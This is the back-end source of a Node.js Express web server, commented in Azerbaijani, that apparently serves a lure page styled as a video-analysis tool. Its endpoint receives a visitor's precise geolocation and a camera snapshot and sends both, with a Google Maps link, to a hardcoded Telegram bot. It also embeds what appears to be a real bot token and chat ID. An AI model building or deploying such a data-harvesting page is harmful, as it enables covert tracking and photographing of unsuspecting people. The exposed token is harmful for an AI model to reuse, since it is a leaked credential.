const express = require('express');
const path = require('path');
const fetch = require('node-fetch'); // Node.js 18-dən köhnə versiyalar üçün
const FormData = require('form-data'); // Form-data göndərmək üçün
require('dotenv').config(); // .env fayllarını yükləmək üçün

const app = express();
const PORT = process.env.PORT || 3000; // Render portu təyin edəcək

// TƏHLÜKƏSİZLİK QEYDİ: Bu dəyərləri .env faylında saxlamalısınız!
// Render.com-da Environment Variables kimi təyin edin.
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8231095129:AAGr90rEuTxA2Aw6kIv-jMSvr0gVqLN_XE4';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '6248478977';

// Middleware
app.use(express.json({ limit: '50mb' })); // Gələn JSON məlumatını işləmək üçün (şəkil üçün limit artırıldı)
app.use(express.static(path.join(__dirname, 'public'))); // `public` qovluğunu statik fayllar üçün təyin edin

// Frontenddən gələn məlumatları qəbul edən API endpoint
app.post('/api/send-data', async (req, res) => {
    const { videoUrl, location, image } = req.body;

    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
        console.error("Telegram bot token və ya chat ID təyin edilməyib.");
        return res.status(500).json({ message: "Server konfiqurasiya xətası. Lütfən, .env dəyişənlərini yoxlayın." });
    }

    try {
        let messageText = `⚡️ *Yeni Video Analiz Girişi!* ⚡️\n\n`;
        messageText += `*Video URL:* ${videoUrl || 'Təyin edilməyib'}\n`;
        
        // Lokasiya məlumatı əlavə et
        if (location && location.latitude && location.longitude) {
            messageText += `*Lokasiya:* [Google Maps-də Gör] (https://www.google.com/maps?q=${location.latitude},${location.longitude})\n`;
            messageText += `  Enlem: ${location.latitude}\n`;
            messageText += `  Boylam: ${location.longitude}\n`;
            messageText += `  Dəqiqlik: ${location.accuracy ? location.accuracy + ' metr' : 'Təyin edilməyib'}\n`;
        } else {
            messageText += `*Lokasiya:* İstifadəçi tərəfindən rədd edildi və ya əldə edilmədi.\n`;
        }

        // Telegrama mətn mesajı göndər
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: messageText,
                parse_mode: 'Markdown'
            })
        });
        console.log("Mətn mesajı Telegrama göndərildi.");

        // Əgər şəkil varsa, şəkli Telegrama göndər
        if (image) {
            const base64Data = image.replace(/^data:image\/\w+;base64,/, ""); // "data:image/jpeg;base64," hissəsini sil
            const imageBuffer = Buffer.from(base64Data, 'base64');

            const form = new FormData();
            form.append('chat_id', TELEGRAM_CHAT_ID);
            form.append('photo', imageBuffer, { filename: 'user_camera_capture.jpg', contentType: 'image/jpeg' });
            form.append('caption', `Kamera görüntüsü (${new Date().toLocaleString('az-AZ')})`);

            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: form,
                headers: form.getHeaders() 
            });
            console.log("Kamera görüntüsü Telegrama göndərildi.");
        }

        res.status(200).json({ message: "Məlumatlar uğurla qəbul edildi və Telegrama göndərildi." });

    } catch (error) {
        console.error("Məlumatları Telegrama göndərərkən xəta baş verdi:", error);
        res.status(500).json({ message: "Məlumatları emal edərkən daxili server xətası: " + error.message });
    }
});

// Bütün digər sorğular üçün index.html-i qaytar
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Serveri başlat
app.listen(PORT, () => {
    console.log(`Server ${PORT} portunda işləyir.`);
});
